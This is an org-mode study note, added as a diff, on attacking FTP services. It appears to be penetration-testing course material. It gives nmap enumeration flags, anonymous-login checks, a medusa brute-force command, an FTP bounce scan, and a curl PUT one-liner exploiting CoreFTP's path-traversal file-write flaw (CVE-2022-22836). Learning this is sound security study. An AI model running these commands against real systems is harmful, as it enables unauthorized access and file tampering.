@@ -1,0 +1,60 @@
+:PROPERTIES:
+:ID:       436478d4-2081-4aef-a15c-e3deee023bd3
+:END:
+#+title: FTP
+#+OPTIONS: toc:3 ^:{}
+
+* TOC :toc_3:
+- [[#attacking-ftp][Attacking FTP]]
+  - [[#enumeration][Enumeration]]
+    - [[#nmap][NMAP]]
+  - [[#misconfiguration][Misconfiguration]]
+  - [[#protocol-specific-attack][Protocol Specific Attack]]
+    - [[#brute-forcing-w-medusa][Brute Forcing w Medusa]]
+    - [[#ftp-bounce-attack][FTP Bounce attack]]
+- [[#coreftp-cve-2022-22836][CoreFTP (CVE-2022-22836)]]
+  - [[#concept-of-attack][Concept of Attack]]
+    - [[#coreftp-exploit][CoreFTP Exploit]]
+
+* TODO Attacking FTP
+- =TCP/21=
+
+** Enumeration
+*** NMAP
+- =nmap= ~-sC~ -> *ftp-anon* -> checks if FTP server allows anon login
+- ~-sV~ -> banners (version)
+  
+** Misconfiguration
+- anonymous auth (user: =anonymous=, pass: =" "=)
+
+** Protocol Specific Attack
+*** Brute Forcing w Medusa
+- ~-u~: single user target
+- ~-U~: file w username list
+- ~-P~: file w list of pass
+- ~-M~: protocol
+- ~-h~: target hostname / IP
+- ~medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp~
+*** FTP Bounce attack
+- uses FTP server to deliver outbound traffic to another device on network
+- uses =PORT= command to trick FTP connection into running cmds & getting info from dev rather than server
+- ~nmap -Pn -v -n -p80 -b anon:pass@10.10.110.213 <ip>~
+  
+* CoreFTP (CVE-2022-22836)
+- fot FTP srv that doesn't correctly process =HTTP PUT= req & ledas to =authenticated directory= / =path traversal= & =arbitrary file write= vuln
+
+** Concept of Attack
+- FTP uses =HTTP POST= to upload files
+- CoreFTP srv allows =HTTP PUT= -> *write* to files
+- [[https://www.exploit-db.com/exploits/50652][exploit]]
+- actual process misinterprets user's i/p of path
+- leads to restricted folder being bypassed
+
+*** CoreFTP Exploit
+- ~curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops~
+  
+- create raw HTTP PUT req (~-X PUT~) w basic auth (~--basic -u <user>:<pass>~)
+
+- path for file (~--path-as-is https://<ip>/<relative path>~), content (~--data-binary "PoC."~)
+
+- Host header (~-H "Host: <IP>"~)
